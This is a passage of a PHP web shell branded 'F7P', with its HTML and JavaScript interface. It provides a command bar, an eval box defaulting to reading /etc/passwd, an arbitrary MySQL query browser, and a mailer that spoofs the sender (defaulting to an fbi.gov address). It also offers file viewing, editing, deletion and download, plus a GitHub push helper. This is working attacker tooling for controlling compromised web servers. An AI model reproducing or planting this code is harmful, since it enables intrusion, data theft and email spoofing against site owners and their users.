        saveScrollPosition(window.location.href);
    }
});

        function pushToGitHub() {
    var githubFullPath = document.getElementById('github_full_path');
    var fileInput = document.querySelector('input[name="saveas"]');
    var contentTextarea = document.querySelector('textarea[name="content_plain"]');
    
    if (!githubFullPath) {
        alert('Element github_full_path not found!');
        return;
    }
    
    if (!fileInput) {
        alert('Element saveas not found!');
        return;
    }
    
    if (!contentTextarea) {
        alert('Element content_plain not found!');
        return;
    }
    
    if (githubFullPath.dataset.isValid !== 'true') {
        alert('Cannot push to GitHub!\n\nPlease check:\n1. GitHub API settings (⋮ → GitHub API)\n2. File must be inside Server Path\n3. Server Path and GitHub Path must be set');
        return;
    }
    
    var token = localStorage.getItem('f7p_gh_token_9x7k2m');
    var repo = localStorage.getItem('f7p_gh_repo_9x7k2m');
    var branch = localStorage.getItem('f7p_gh_branch_9x7k2m') || 'main';
    var filePath = fileInput.value;
    var content = contentTextarea.value;
    
    var fullPath = githubFullPath.value;
    var githubPath = fullPath.replace('github.com/' + repo + '/', '');
    var fileName = filePath.split('/').pop();
    
    var btn = document.getElementById('pushToGitBtn');
    if (!btn) return;
    
    var originalText = btn.textContent;
    btn.textContent = 'Uploading...';
    btn.disabled = true;
    btn.style.opacity = '0.7';
    
    var encodedContent = btoa(unescape(encodeURIComponent(content)));
    var apiUrl = 'https://api.github.com/repos/' + repo + '/contents/' + githubPath;
    
    fetch(apiUrl + '?ref=' + branch, {
        headers: {
            'Authorization': 'token ' + token,
            'Accept': 'application/vnd.github.v3+json'
        }
    })
    .then(function(response) {
        if (response.status === 404) {
            return { sha: null };
        } else if (!response.ok) {
            throw new Error('GitHub API error: ' + response.status);
        }
        return response.json();
    })
    .then(function(data) {
        var payload = {
            message: 'Update ' + fileName + ' via F7P',
            content: encodedContent,
            branch: branch
        };
        
        if (data.sha) {
            payload.sha = data.sha;
        }
        
        return fetch(apiUrl, {
            method: 'PUT',
            headers: {
                'Authorization': 'token ' + token,
                'Content-Type': 'application/json',
                'Accept': 'application/vnd.github.v3+json'
            },
            body: JSON.stringify(payload)
        });
    })
    .then(function(response) {
        if (!response.ok) {
            return response.json().then(function(err) {
                throw new Error(err.message || 'Push failed');
            });
        }
        return response.json();
    })
    .then(function(data) {
        btn.textContent = 'Pushed!';
        btn.style.background = '#28a745';
        btn.style.opacity = '1';
        var url = data.content.html_url || '';
        alert('Success...\n' + url);
        setTimeout(function() {
            btn.textContent = 'Push to Git';
            btn.style.background = '#2b3137';
            btn.disabled = false;
            btn.style.opacity = '1';
        }, 3000);
    })
    .catch(function(error) {
        btn.textContent = 'Failed';
        btn.style.background = '#dc3545';
        btn.style.opacity = '1';
        var errorMsg = error.message;
        if (errorMsg.includes('403')) {
            errorMsg = 'Permission denied. Check your token permissions (need "repo" scope)';
        } else if (errorMsg.includes('404')) {
            errorMsg = 'Repository not found. Check repo name format: username/repo';
        }
        alert('Error: ' + errorMsg + '\n\nTarget: ' + fullPath);
        setTimeout(function() {
            btn.textContent = 'Push to Git';
            btn.style.background = '#2b3137';
            btn.disabled = false;
            btn.style.opacity = '1';
        }, 3000);
    });
}

        function showRenameAlert(filename, fullpath, currentDir) {
            var newName = prompt(filename, filename);
            
            if (newName !== null && newName !== '' && newName !== filename) {
                var form = document.createElement('form');
                form.method = 'POST';
                form.action = '?y=' + encodeURIComponent(currentDir);
                
                var oldInput = document.createElement('input');
                oldInput.type = 'hidden';
                oldInput.name = 'oldname';
                oldInput.value = filename;
                
                var newInput = document.createElement('input');
                newInput.type = 'hidden';
                newInput.name = 'newname';
                newInput.value = newName;
                
                var dirInput = document.createElement('input');
                dirInput.type = 'hidden';
                dirInput.name = 'current_dir';
                dirInput.value = currentDir;
                
                var renameInput = document.createElement('input');
                renameInput.type = 'hidden';
                renameInput.name = 'rename';
                renameInput.value = '1';
                
                form.appendChild(oldInput);
                form.appendChild(newInput);
                form.appendChild(dirInput);
                form.appendChild(renameInput);
                document.body.appendChild(form);
                form.submit();
            } else if (newName === '') {
                alert('Nama file tidak boleh kosong!');
            }
        }

        function vibratePhone(duration) {
            duration = duration || 10;
            if (navigator.vibrate) {
                navigator.vibrate(duration);
            }
        }

        document.addEventListener('DOMContentLoaded', function() {
            var clickableElements = document.querySelectorAll(
                'button, .btn-icon, .dropdown-toggle, .inputzbut, ' +
                'a[href], .brand, [onclick], .dropdown-menu a'
            );
            
            clickableElements.forEach(function(el) {
                el.addEventListener('click', function(e) {
                    vibratePhone(10);
                });
            });
setTimeout(function() {
    var btn = document.getElementById('pushToGitBtn');
    var input = document.getElementById('github_full_path');
    if (btn && input) {
        if (input.dataset.isValid === 'true' && input.value && input.value !== 'Loading...' && input.value !== '') {
            btn.disabled = false;
            btn.style.opacity = '1';
            btn.style.cursor = 'pointer';
            btn.style.background = '#2b3137';
        } else {
            btn.disabled = true;
            btn.style.opacity = '0.5';
            btn.style.cursor = 'not-allowed';
        }
    }
}, 500);
            var observer = new MutationObserver(function(mutations) {
                mutations.forEach(function(mutation) {
                    mutation.addedNodes.forEach(function(node) {
                        if (node.nodeType === 1) {
                            var newClickables = node.querySelectorAll(
                                'button, .btn-icon, .dropdown-toggle, .inputzbut, ' +
                                'a[href], [onclick]'
                            );
                            newClickables.forEach(function(el) {
                                el.addEventListener('click', function(e) {
                                    vibratePhone(10);
                                });
                            });
                           
                            if (node.matches && node.matches(
                                'button, .btn-icon, .dropdown-toggle, .inputzbut, ' +
                                'a[href], [onclick]'
                            )) {
                                node.addEventListener('click', function(e) {
                                    vibratePhone(10);
                                });
                            }
                        }
                    });
                });
            });
            
            observer.observe(document.body, {
                childList: true,
                subtree: true
            });
        });
    </script>
</head>
<body>

    <div id="header">
        <div class="brand" onclick="goToRoot();" title="Go to root">F<span>7</span>P</div>
        <div class="breadcrumb" id="breadcrumb">
            <?php echo $breadcrumb_full; ?>
        </div>
        <div class="header-actions">
            <button class="btn-icon" onclick="toggleCommand();" title="Toggle Command"><img width=24px src=f7p-assets/terminalx.png></button>
            <div class="dropdown">
                <button class="dropdown-toggle" onclick="toggleDropdown();" title="More">⋮</button>
                <div class="dropdown-menu" id="dropdown-menu">
                    <a href="?<?php echo "y=".$pwd; ?>" data-no-ajax="true"><img width=24px src=f7p-assets/explorer.png> Explorer</a>
                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=github" data-no-ajax="true"><img width=24px src=f7p-assets/github.png> GitHub API</a>
                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=shell" data-no-ajax="true"><img width=24px src=f7p-assets/terminalx.png> Super Shell</a>
                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=php" data-no-ajax="true"><img width=24px src=f7p-assets/eval.png> Eval</a>
                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=mysql" data-no-ajax="true"><img width=24px src=f7p-assets/mysql.png> MySQL</a>
                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=phpinfo" data-no-ajax="true"><img width=24px src=f7p-assets/php.png> PHPInfo</a>
                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=netsploit" data-no-ajax="true"><img width=24px src=f7p-assets/bug.png> Bug test</a>
                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=mail" data-no-ajax="true"><img width=24px src=f7p-assets/mailer.png> Mail</a>
                    <a href="?logout=1" data-no-ajax="true" style="border-top:2px solid #eee;margin-top:4px;color:#cc3333;"><img width=24px src=f7p-assets/logout.png> Logout</a>
                </div>
            </div>
        </div>
    </div>

    <div id="content">

    <div id="command-bar">
        <form action="?y=<?php echo $pwd; ?>&amp;x=shell" method="post">
            <div class="cmd-row">
                <span class="prompt-label"><?php echo $prompt; ?></span>
                <input id="cmd" class="inputz" type="text" name="cmd" placeholder="command..." value="" />
                <input class="inputzbut" type="submit" value="▶" name="submitcmd" />
            </div>
        </form>
    </div>

    <?php
    if(isset($_GET['x']) && ($_GET['x'] == 'php')){
    ?>
        <form action="?y=<?php echo $pwd; ?>&amp;x=php" method="post">
            <textarea class="output" name="cmd" id="cmd"><?php
            if(isset($_POST['submitcmd'])) {
                echo eval(magicboom($_POST['cmd']));
            }
            else echo "echo file_get_contents('/etc/passwd');";
            ?></textarea>
            <div class="cmd-row mt-2">
                <input class="inputzbut" type="submit" value="Execute" name="submitcmd" style="width:100%;">
            </div>
        </form>
    <?php
    }
    elseif(isset($_GET['x']) && ($_GET['x'] == 'mysql')){
        if(isset($_GET['sqlhost']) && isset($_GET['sqluser']) && isset($_GET['sqlpass']) && isset($_GET['sqlport'])){
            $sqlhost = $_GET['sqlhost'];
            $sqluser = $_GET['sqluser'];
            $sqlpass = $_GET['sqlpass'];
            $sqlport = $_GET['sqlport'];
            if($con = @mysql_connect($sqlhost.":".$sqlport,$sqluser,$sqlpass)){
                $msg = "<div style='padding:4px;'>";
                $msg .= "<p class='text-success'>Connected to ".$sqluser."@".$sqlhost.":".$sqlport;
                $msg .= " &nbsp; <a href=\"?y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;\">DB</a>";
                if(isset($_GET['db'])) $msg .= " &nbsp; <a href=\"?y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;db=".$_GET['db']."\">".htmlspecialchars($_GET['db'])."</a>";
                if(isset($_GET['table'])) $msg .= " &nbsp; <a href=\"?y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;db=".$_GET['db']."&amp;table=".$_GET['table']."\">".htmlspecialchars($_GET['table'])."</a>";
                $msg .= "</p><p style='font-size:12px;color:#666;'>version: ".mysql_get_server_info($con)."</p>";
                $msg .= "</div>";
                echo $msg;
                if(isset($_GET['db']) && (!isset($_GET['table'])) && (!isset($_GET['sqlquery']))){
                    $db = $_GET['db'];
                    $query = "SHOW TABLES FROM ".$db;
                    $msgq  = "<div style='padding:4px;'><form action=\"?\" method=\"get\">
                    <input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
                    <input type=\"hidden\" name=\"x\" value=\"mysql\" />
                    <input type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" />
                    <input type=\"hidden\" name=\"sqluser\" value=\"".$sqluser."\" />
                    <input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" />
                    <input type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" />
                    <input type=\"hidden\" name=\"db\" value=\"".$db."\" />
                    <textarea name=\"sqlquery\" class=\"output\" style=\"height:80px;\">$query</textarea>
                    <div class='cmd-row mt-2'><input class=\"inputzbut\" style=\"width:100%;\" name=\"submitquery\" type=\"submit\" value=\"Execute\" /></div>
                    </form></div>";
                    $tables = array();
                    $msg = $msgq."<div class='table-wrap'><table class=\"explore\"><thead><tr><th>Tables in ".$db."</th></tr></thead><tbody>";
                    $hasil = @mysql_list_tables($db,$con);
                    while(list($table) = @mysql_fetch_row($hasil)){
                        @array_push($tables,$table);
                    }
                    @sort($tables);
                    foreach($tables as $table){
                        $msg .= "<tr><td><a href=\"?y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;db=".$db."&amp;table=".$table."\">".$table."</a></td></tr>";
                    }
                    $msg .= "</tbody></table></div>";
                }
                elseif(isset($_GET['table']) && (!isset($_GET['sqlquery']))){
                    $db = $_GET['db'];
                    $table = $_GET['table'];
                    $query = "SELECT * FROM ".$db.".".$table." LIMIT 0,50;";
                    $msgq  = "<div style='padding:4px;'><form action=\"?\" method=\"get\">
                    <input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
                    <input type=\"hidden\" name=\"x\" value=\"mysql\" />
                    <input type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" />
                    <input type=\"hidden\" name=\"sqluser\" value=\"".$sqluser."\" />
                    <input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" />
                    <input type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" />
                    <input type=\"hidden\" name=\"db\" value=\"".$db."\" />
                    <input type=\"hidden\" name=\"table\" value=\"".$table."\" />
                    <textarea name=\"sqlquery\" class=\"output\" style=\"height:80px;\">".$query."</textarea>
                    <div class='cmd-row mt-2'><input class=\"inputzbut\" style=\"width:100%;\" name=\"submitquery\" type=\"submit\" value=\"Execute\" /></div>
                    </form></div>";
                    $msg = $msgq."<div class='table-wrap'><table class=\"explore\"><thead><tr>";
                    $hasil = @mysql_query("SHOW FIELDS FROM ".$db.".".$table);
                    while(list($column) = @mysql_fetch_row($hasil)){
                        $msg .= "<th>".$column."</th>";
                    }
                    $msg .= "</tr></thead><tbody>";
                    $hasil = @mysql_query("SELECT * FROM ".$db.".".$table." LIMIT 0,50");
                    while($datas = @mysql_fetch_assoc($hasil)){
                        $msg .= "<tr>";
                        foreach($datas as $data){
                            if(trim($data) == "") $data = "&nbsp;";
                            $msg .= "<td>".htmlspecialchars(substr($data,0,30))."</td>";
                        }
                        $msg .= "</tr>";
                    }
                    $msg .= "</tbody></table></div>";
                }
                elseif(isset($_GET['submitquery']) && ($_GET['sqlquery'] != "")){
                    $db = $_GET['db'];
                    $query = magicboom($_GET['sqlquery']);
                    $msgq  = "<div style='padding:4px;'><form action=\"?\" method=\"get\">
                    <input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
                    <input type=\"hidden\" name=\"x\" value=\"mysql\" />
                    <input type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" />
                    <input type=\"hidden\" name=\"sqluser\" value=\"".$sqluser."\" />
                    <input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" />
                    <input type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" />
                    <input type=\"hidden\" name=\"db\" value=\"".$db."\" />
                    <textarea name=\"sqlquery\" class=\"output\" style=\"height:80px;\">".$query."</textarea>
                    <div class='cmd-row mt-2'><input class=\"inputzbut\" style=\"width:100%;\" name=\"submitquery\" type=\"submit\" value=\"Execute\" /></div>
                    </form></div>";
                    $msg = $msgq;
                    @mysql_select_db($db);
                    $querys = explode(";",$query);
                    foreach($querys as $q){
                      if(trim($q) != ""){
                        $hasil = mysql_query($q);
                        if($hasil){
                            $msg .= "<p class='text-success' style='font-size:12px;margin:4px 0;'>".htmlspecialchars($q)."</p>";
                            $msg .= "<div class='table-wrap'><table class=\"explore\"><thead><tr>";
                            for($i=0;$i<@mysql_num_fields($hasil);$i++)
                                $msg .= "<th>".htmlspecialchars(@mysql_field_name($hasil,$i))."</th>";
                            $msg .= "</tr></thead><tbody>";
                            for($i=0;$i<@mysql_num_rows($hasil);$i++)
                            {
                                $rows=@mysql_fetch_array($hasil);
                                $msg .= "<tr>";
                                for($j=0;$j<@mysql_num_fields($hasil);$j++)
                                {
                                    $dataz = ($rows[$j] == "") ? "&nbsp;" : htmlspecialchars(substr($rows[$j],0,40));
                                    $msg .= "<td>".$dataz."</td>";
                                }
                                $msg .= "</tr>";
                            }
                            $msg .= "</tbody></table></div>";
                        }
                        else $msg .= "<p class='text-danger' style='font-size:12px;margin:4px 0;'>".htmlspecialchars($q)."</p>";
                      }
                    }
                }
                else {
                    $query = "SHOW DATABASES;";
                    $msgq  = "<div style='padding:4px;'><form action=\"?\" method=\"get\">
                    <input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
                    <input type=\"hidden\" name=\"x\" value=\"mysql\" />
                    <input type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" />
                    <input type=\"hidden\" name=\"sqluser\" value=\"".$sqluser."\" />
                    <input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" />
                    <input type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" />
                    <textarea name=\"sqlquery\" class=\"output\" style=\"height:80px;\">".$query."</textarea>
                    <div class='cmd-row mt-2'><input class=\"inputzbut\" style=\"width:100%;\" name=\"submitquery\" type=\"submit\" value=\"Execute\" /></div>
                    </form></div>";
                    $dbs = array();
                    $msg = $msgq."<div class='table-wrap'><table class=\"explore\"><thead><tr><th>Databases</th></tr></thead><tbody>";
                    $hasil = @mysql_list_dbs($con);
                    while(list($db) = @mysql_fetch_row($hasil)){
                        @array_push($dbs,$db);
                    }
                    @sort($dbs);
                    foreach($dbs as $db){
                        $msg .= "<tr><td><a href=\"?y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;db=".$db."\">".$db."</a></td></tr>";
                    }
                    $msg .= "</tbody></table></div>";
                }
                @mysql_close($con);
            }
            else $msg = "<p class='text-center text-danger'>Cannot connect to MySQL</p>";
            echo $msg;
        }
        else{
        ?>
        <form action="?" method="get">
            <input type="hidden" name="y" value="<?php echo $pwd; ?>" />
            <input type="hidden" name="x" value="mysql" />
            <table class="tabnet">
                <tr><th colspan="2">Connect to MySQL</th></tr>
                <tr><td>Host</td><td><input class="inputz w-full" type="text" name="sqlhost" value="localhost" /></td></tr>
                <tr><td>User</td><td><input class="inputz w-full" type="text" name="sqluser" value="root" /></td></tr>
                <tr><td>Pass</td><td><input class="inputz w-full" type="text" name="sqlpass" value="password" /></td></tr>
                <tr><td>Port</td><td><input class="inputz" style="width:60px;" type="text" name="sqlport" value="3306" /> <input class="inputzbut" type="submit" value="Connect" name="submitsql" /></td></tr>
            </table>
        </form>
        <?php }
    }
    elseif(isset($_GET['x']) && ($_GET['x'] == 'mail')){
        if(isset($_POST['mail_send'])){
            $mail_to = $_POST['mail_to'];
            $mail_from = $_POST['mail_from'];
            $mail_subject = $_POST['mail_subject'];
            $mail_content = magicboom($_POST['mail_content']);
            if(@mail($mail_to,$mail_subject,$mail_content,"FROM:$mail_from")){
                $msg = "Email sent to $mail_to";
            }
            else $msg = "Send failed";
        }
    ?>
        <form action="?y=<?php echo $pwd; ?>&amp;x=mail" method="post">
            <textarea class="output" name="mail_content" style="height:250px;">Hey there, please patch me ASAP ;-p</textarea>
            <div class="cmd-row mt-2"><input class="inputz" style="flex:2;" type="text" value="admin@example.com" name="mail_to" /><span style="font-size:12px;color:#666;flex:1;">to</span></div>
            <div class="cmd-row"><input class="inputz" style="flex:2;" type="text" value="F7P@fbi.gov" name="mail_from" /><span style="font-size:12px;color:#666;flex:1;">from</span></div>
            <div class="cmd-row"><input class="inputz" style="flex:2;" type="text" value="patch me" name="mail_subject" /><span style="font-size:12px;color:#666;flex:1;">subject</span></div>
            <div class="cmd-row mt-2"><input class="inputzbut" style="width:100%;" type="submit" value="Send" name="mail_send" /></div>
            <div style="text-align:center;margin:4px;font-size:14px;"><?php echo $msg; ?></div>
        </form>
    <?php
    }
    elseif(isset($_GET['x']) && ($_GET['x'] == 'phpinfo')){
        @ob_start();
        @eval("phpinfo();");
        $buff = @ob_get_contents();
        @ob_end_clean();
        $awal = strpos($buff,"<body>")+6;
        $akhir = strpos($buff,"</body>");
        echo "<div class=\"phpinfo\">".substr($buff,$awal,$akhir-$awal)."</div>";
    }
    elseif(isset($_GET['img']) && ($_GET['img'] != "")){
        $file = magicboom($_GET['img']);
        
        if(is_file($file)){
            $file_extension = strtolower(pathinfo($file, PATHINFO_EXTENSION));
            $image_extensions = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'svg', 'ico'];
            
            if(in_array($file_extension, $image_extensions)){
                $size = ukuran($file);
                $perms = get_perms($file);
                $filn = basename($file);
                
                echo "<div style='margin:4px 0;font-size:13px;color:#666;'>".htmlspecialchars($file)."</div>";
                echo "<div style='display:flex;gap:6px;flex-wrap:wrap;margin:4px 0;font-size:13px;'>";
                echo "<span>Size: $size</span>";
                echo "<span>Perms: $perms</span>";
                echo "</div>";
                echo "<div style='display:flex;gap:8px;flex-wrap:wrap;margin:4px 0;'>";
                echo "<a href=\"?y=$pwd&amp;delete=$file\" onclick=\"return confirmDelete('" . addslashes($filn) . "', 'file');\">Delete</a>";
                echo "<a href=\"?y=$pwd&amp;dl=$file\">Download</a>";
                echo "<a href=\"?y=$pwd&amp;dlgzip=$file\">.gz</a>";
                echo "</div>";
                
                echo "<div style='text-align:center;background:#fff;padding:20px;border-radius:6px;border:1px solid #eee;'>";
                echo "<img src='?img_direct=" . urlencode($file) . "' style='max-width:100%;max-height:80vh;' />";
                echo "</div>";
            } else {
                echo "<div style='padding:20px;color:#cc3333;'>File bukan gambar</div>";
            }
        } else {
            echo "<div style='padding:20px;color:#cc3333;'>File tidak ditemukan</div>";
        }
    }
    elseif(isset($_GET['view']) && ($_GET['view'] != "")){
        if(is_file($_GET['view'])){
            $file = magicboom($_GET['view']);
            $file_extension = strtolower(pathinfo($file, PATHINFO_EXTENSION));
            $image_extensions = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'svg', 'ico'];
            
            if(in_array($file_extension, $image_extensions)){
                header("Location: ?y=" . urlencode($pwd) . "&img=" . urlencode($file));
                exit;
            }
            
            if(!$win && $posix){
                $name = @posix_getpwuid(@fileowner($file));
                $group = @posix_getgrgid(@filegroup($file));
                $owner = $name['name'] . " : " . $group['name'];
            } else {
                $owner = $user;
            }
            
            $filn = basename($file);
            echo "<div style='margin:4px 0;font-size:13px;color:#666;'>".htmlspecialchars($file)."</div>";
            echo "<div style='display:flex;gap:6px;flex-wrap:wrap;margin:4px 0;font-size:13px;'>";
            echo "<span>Size: " . ukuran($file) . "</span>";
            echo "<span>Perms: " . get_perms($file) . "</span>";
            echo "<span>Owner: " . $owner . "</span>";
            echo "</div>";
            echo "<div style='display:flex;gap:8px;flex-wrap:wrap;margin:4px 0;'>";
            echo "<a href=\"?y=$pwd&amp;edit=$file\">Edit</a>";
            echo "<a href=\"?y=$pwd&amp;delete=$file\" onclick=\"return confirmDelete('" . addslashes($filn) . "', 'file');\">Delete</a>";
            echo "<a href=\"?y=$pwd&amp;dl=$file\">Download</a>";
            echo "<a href=\"?y=$pwd&amp;dlgzip=$file\">.gz</a>";
            echo "<a href=\"?y=" . $pwd . "&amp;view=" . $file . "&amp;type=code\">Code</a>";
            echo "</div>";
            
            if(isset($_GET['type']) && ($_GET['type'] == 'code')){
                echo "<div class=\"viewfile\">";
                $file_content = @file_get_contents($file);
                if($file_content !== false) {
                    @highlight_string($file_content);
                } else {
                    echo "Cannot read file";
                }
                echo "</div>";
            } else {
                echo "<div class=\"viewfile\">";
                $content = @file_get_contents($file);
                if($content !== false) {
                    echo nl2br(htmlentities($content, ENT_QUOTES, 'UTF-8'));
                } else {
                    echo "Cannot read file";
                }
                echo "</div>";
            }
        }
        elseif(is_dir($_GET['view'])){
            echo showdir($pwd, $prompt);
        }
    }
    elseif(isset($_GET['edit']) && ($_GET['edit'] != "")){
        $file = isset($_GET['edit']) ? $_GET['edit'] : '';
        
        if(isset($_POST['save'])){
    $file = $_POST['saveas'];
    
    $content = isset($_POST['content']) ? $_POST['content'] : '';
    if(empty($content) && isset($_POST['content_plain'])) {
        $content = $_POST['content_plain'];
    }
    
    $timezones = [
        'Asia/Jakarta', 'Asia/Makassar', 'Asia/Jayapura',
        'Asia/Singapore', 'Asia/Bangkok', 'Asia/Ho_Chi_Minh',
        'Asia/Kuala_Lumpur', 'Asia/Manila', 'Asia/Tokyo',
        'America/New_York', 'America/Los_Angeles', 'Europe/London',
        'Europe/Paris', 'Australia/Sydney'
    ];
    
    $user_timezone = isset($_POST['user_timezone']) ? $_POST['user_timezone'] : 'Asia/Jakarta';
    
    if (!in_array($user_timezone, $timezones)) {
        $user_timezone = 'Asia/Jakarta';
    }
    
    @date_default_timezone_set($user_timezone);
    
    $msg = "";
    
    if($filez = @fopen($file,"w")){
        $time = date("h:i:s a d-M-Y", time());
        if(@fwrite($filez, $content)) {
            $time = preg_replace('/(\d{2}:\d{2}:\d{2}\s[ap]m)/', '<strong>$1</strong>', $time);
            $msg = "Saved at " . $time;
        } else {
            $msg = "Failed to write";
        }
        @fclose($filez);
    } else {
        $msg = "Permission denied";
    }
}
        $content = "";
        if(file_exists($file) && is_file($file)){
            if($filez = @fopen($file,"r")){
                while(!feof($filez)){
                    $content .= fgets($filez);
                }
                @fclose($filez);
            }
        }
        
        $display_content = htmlspecialchars($content, ENT_QUOTES, 'UTF-8');
        $content_base64 = base64_encode($content);
        ?>
        <form action="?y=<?php echo $pwd; ?>&amp;edit=<?php echo urlencode($file); ?>" method="post" id="editForm">
    <input type="hidden" name="saveas" value="<?php echo htmlspecialchars($file, ENT_QUOTES, 'UTF-8'); ?>">
    <textarea class="output" name="content_plain" id="editorContent" style="height:400px;"><?php echo $display_content; ?></textarea>
    
    <div class="cmd-row mt-2" style="display:flex;gap:8px;align-items:center;width:100%;flex-wrap:wrap;">
        <a href="?y=<?php echo $pwd; ?>" data-no-ajax="true"><img width=24px src=f7p-assets/previous.png></a>
        <input class="inputz" id="saveas_input" type="text" value="<?php echo htmlspecialchars($file, ENT_QUOTES, 'UTF-8'); ?>" style="flex:2;min-width:120px;" readonly />
        <input class="inputzbut" type="submit" value="Save" name="save" style="flex:1;min-width:70px;" />
    </div>
    
            <div class="cmd-row mt-2" style="display:flex;gap:8px;align-items:center;width:100%;flex-wrap:wrap;">
                <span style="font-size:13px;color:#666;white-space:nowrap;flex-shrink:0;"><img width=24px src=f7p-assets/github.png></span>
                <input class="inputz" id="github_full_path" type="text" style="flex:2;min-width:120px;font-size:13px;font-family:monospace;" 
                       value="Loading..." readonly />
                <input class="inputzbut" type="button" value="Push to Git" id="pushToGitBtn" onclick="pushToGitHub()" style="flex:1;min-width:70px;background:#2b3137;opacity:0.5;cursor:not-allowed;" disabled />
            </div>
            
            <div class="cmd-row mt-2" style="display:flex;gap:8px;flex-wrap:wrap;">
                <input class="inputzbut" type="button" value="Paste + Save" id="pasteSaveBtn" style="flex:1;background:#1f6feb;" />
                <input class="inputzbut" type="button" value="Remove Comments" id="removeCommentsBtn" style="flex:1;background:#d29922;" />
            </div>
        </form>
        <?php
        if(isset($msg) && $msg != "") {
            echo "<div style='text-align:center;margin:10px;font-size:14px;'>{$msg}</div>";
        }
        ?>
        <script>
        (function() {
            function scrollInputsToEnd() {
                var input1 = document.getElementById('saveas_input');
                if (input1) {
                    input1.scrollLeft = input1.scrollWidth;
                    input1.setSelectionRange(input1.value.length, input1.value.length);
                }
                
                var input2 = document.getElementById('github_full_path');
                if (input2) {
                    input2.scrollLeft = input2.scrollWidth;
                    input2.setSelectionRange(input2.value.length, input2.value.length);
                }
            }
            
            function updatePushButton() {
                var btn = document.getElementById('pushToGitBtn');
                var input = document.getElementById('github_full_path');
                
                if (!btn || !input) return;
                
                var isValid = input.dataset.isValid === 'true';
                var hasValue = input.value && input.value !== '' && input.value !== 'Loading...';
                
                if (isValid && hasValue) {
                    btn.disabled = false;
                    btn.style.opacity = '1';
                    btn.style.cursor = 'pointer';
                    btn.style.background = '#2b3137';
                } else {
                    btn.disabled = true;
                    btn.style.opacity = '0.5';
                    btn.style.cursor = 'not-allowed';
                }
            }
            
            if (document.readyState === 'complete') {
                setTimeout(function() {
                    scrollInputsToEnd();
                    updatePushButton();
                }, 100);
            } else {
                window.addEventListener('load', function() {
                    setTimeout(function() {
                        scrollInputsToEnd();
                        updatePushButton();
                    }, 150);
                });
            }
            
            var origUpdatePaths = window.updatePaths;
            if (origUpdatePaths) {
                window.updatePaths = function() {
                    origUpdatePaths();
                    setTimeout(function() {
                        scrollInputsToEnd();
                        updatePushButton();
                    }, 50);
                };
            }
            
            ['saveas_input', 'github_full_path'].forEach(function(id) {
                var el = document.getElementById(id);
                if (el) {
                    var observer = new MutationObserver(function() {
                        setTimeout(function() {
                            scrollInputsToEnd();
                            updatePushButton();
                        }, 50);
                    });
                    observer.observe(el, {
                        attributes: true,
                        attributeFilter: ['value', 'data-isValid']
                    });
                    el.addEventListener('change', function() {
                        scrollInputsToEnd();
                        updatePushButton();
                    });
                    el.addEventListener('input', function() {
                        scrollInputsToEnd();
                        updatePushButton();
                    });
                }
            });
            
            var pasteSaveBtn = document.getElementById('pasteSaveBtn');
            var removeCommentsBtn = document.getElementById('removeCommentsBtn');
            var editorContent = document.getElementById('editorContent');
            var editForm = document.getElementById('editForm');
            
            function removeComments(input) {
                return input
                    .replace(/<!--[\s\S]*?-->/g, '')
                    .replace(/\/\*[\s\S]*?\*\//g, '')
                    .replace(/(^|\s)\/\/.*$/gm, '')
                    .trim();
            }
            
            if (pasteSaveBtn && editorContent && editForm) {
                pasteSaveBtn.addEventListener('click', async function() {
                    var btn = this;
                    var originalText = btn.value;
                    
                    if (!navigator.clipboard) {
                        alert('Clipboard tidak tersedia');
                        return;
                    }
                    
                    try {
                        btn.value = 'Reading...';
                        btn.disabled = true;
                        btn.style.opacity = '0.7';
                        
                        var text = await navigator.clipboard.readText();
                        
                        if (text && text.trim() !== '') {
                            editorContent.value = text;
                            editorContent.dispatchEvent(new Event('input'));
                            
                            btn.value = 'Saving...';
                            
                            var submitBtn = editForm.querySelector('input[name="save"]');
                            if (submitBtn) {
                                submitBtn.click();
                            } else {
                                editForm.submit();
                            }
                        } else {
                            alert('Clipboard kosong');
                            btn.value = originalText;
                            btn.disabled = false;
                            btn.style.opacity = '1';
                        }
                    } catch (err) {
                        alert('Gagal membaca clipboard: ' + err.message);
                        btn.value = originalText;
                        btn.disabled = false;
                        btn.style.opacity = '1';
                    }
                });
            }
            
            if (removeCommentsBtn && editorContent) {
                removeCommentsBtn.addEventListener('click', function() {
                    var currentContent = editorContent.value;
                    var result = removeComments(currentContent);
                    
                    if (result !== currentContent) {
